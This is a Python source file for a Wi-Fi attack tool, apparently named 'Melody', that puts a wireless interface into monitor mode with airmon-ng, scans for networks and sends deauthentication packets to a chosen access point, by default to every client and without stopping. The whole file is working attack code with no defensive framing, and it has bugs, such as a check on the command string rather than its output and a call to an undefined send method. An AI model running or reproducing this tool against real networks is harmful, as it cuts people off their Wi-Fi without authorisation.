from Beacon import Beacon
from Deauthentication import Deauthentication
import os
import multiprocessing as mp
import utils


class Melody(object):
    def __init__(self, interface):
        self.interface = interface
        self.beacon = Beacon(interface)
        self.deauthentication = Deauthentication()

    def set_monitor_mode(self):
        check_cmdline = "ifconfig | grep '{}'".format(self.interface)
        start_cmdline = 'airmon-ng start {}'.format(self.interface)
        stop_cmdline = 'airmon-ng stop {}'.format(self.interface)

        check_result = os.popen(check_cmdline).read()
        print(check_result)
        if not check_cmdline:
            raise Exception('NOT FOUND INTERFACE: {}'.format(self.interface))
        else:
            if 'mon' in check_result:
                print('INTERFACE FOUND')
                self.interface += 'mon'
            else:
                os.system('airmon-ng check kill')
                os.system(start_cmdline)
                self.interface += 'mon'

    def flood(self, workers=10):
        senders = list()
        for _ in range(10, 10+workers):
            senders.append(mp.Process(target=self.send))
        for sender in senders:
            sender.start()
        for sender in senders:
            sender.join()

    def deauth(self):
        self.beacon.sniff()
        networks = self.beacon.networks

        utils.show_all_networks(networks)
        input_idx = int(input('Enter a BSSID to perform an deauth attack (q to quit): '))
        # input deauth info
        target_bssid = networks[input_idx]['bssid']
        target_channel = networks[input_idx]['channel']
        target_client = input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
        if not target_client:
            target_client = 'FF:FF:FF:FF:FF:FF'
        deauth_pckt_count = input('Number of deauth packets (Default: -1 [constant]): ')
        if not deauth_pckt_count:
            deauth_pckt_count = -1

        print('Changing ' + self.interface + ' to channel ' + str(target_channel))
        os.system('airmon-ng check kill')
        os.system("iwconfig %s channel %d" % (self.interface, target_channel))
        # start deauth
        print(networks[input_idx])
        self.deauthentication.send(target_bssid, target_client, deauth_pckt_count)


if __name__ == '__main__':
    interface = "wlan0"
    m = Melody(interface=interface)
    m.set_monitor_mode()
    m.deauth()




